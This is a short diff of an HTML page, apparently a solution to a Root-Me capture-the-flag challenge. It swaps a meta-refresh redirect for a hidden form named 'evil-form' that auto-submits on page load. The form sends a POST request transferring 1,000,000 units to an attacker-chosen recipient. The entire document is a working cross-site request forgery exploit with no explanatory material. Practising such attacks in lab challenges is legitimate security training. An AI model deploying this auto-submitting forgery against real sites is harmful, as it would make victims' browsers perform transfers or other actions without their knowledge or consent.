@@ -1,10 +1,19 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="0;url=https://instance-019aa377-a1db-70ca-acdf-88b0495225ca.challenges.root-me.pro/transfer?recipient=TON_PSEUDO&amount=10000000">
-</head>
 <body>
-    <p>Si vous n'êtes pas redirigé, <a href="https://instance-019aa377-a1db-70ca-acdf-88b0495225ca.challenges.root-me.pro/transfer?recipient=TON_PSEUDO&amount=10000000">cliquez ici</a>.</p>
+
+    <form action="https://instance-019aa377-a1db-70ca-acdf-88b0495225ca.challenges.root-me.pro/transfer" method="POST" id="evil-form">
+        
+        <input type="hidden" name="recipient" value="TON_PSEUDO">
+        
+        <input type="hidden" name="amount" value="1000000">
+        
+    </form>
+
+    <script>
+        // Dès que la page charge, on valide le formulaire automatiquement
+        document.getElementById('evil-form').submit();
+    </script>
+
 </body>
 </html>
